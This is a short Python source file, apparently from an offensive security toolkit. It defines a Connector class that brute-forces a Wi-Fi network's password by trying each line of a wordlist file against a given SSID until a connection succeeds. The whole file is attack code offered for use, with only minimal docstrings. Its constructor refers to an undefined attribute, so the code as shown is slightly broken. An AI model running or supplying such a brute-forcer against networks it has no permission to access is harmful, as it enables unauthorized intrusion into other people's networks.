from wireless import Wireless
from pyhtools.UI.colors import BRIGHT_YELLOW, BRIGHT_RED, BRIGHT_WHITE
    
class Connector():
    '''
    Connector class tries to bruteforce a connection with a network from given SSID using a passwords file.
    
    Args:
        path (str): path to passwords file.
    
    Methods:
    connect: attempts ssid connection.
    '''
    
    def __init__(self):
        self.passwords = self.args.path
        self.wire = Wireless()
        '''
        Wireless class from wireless package. Takes SSID, password as input to attempt connection.
        
        Args:
            ssid (str): network name
            password (str): password for network
        '''
    def connect(self, ssid):
        '''
        Attempts bruteforce with passwords file from constructor.
        
        Args:
            ssid: network name to attempt connection.
        '''
        
        with open(self.passwords, 'r') as f:
            print(BRIGHT_YELLOW + '[-_] Attempting connection...')
            for line in f.readlines():
                if self.wire.connect(ssid=ssid, password=line.strip()) == True:
                    print(BRIGHT_WHITE + f'[+] {line.strip()} Successful! Connected to network.')
                    exit(0)
            print(BRIGHT_RED + '[-] Failed to Connect.')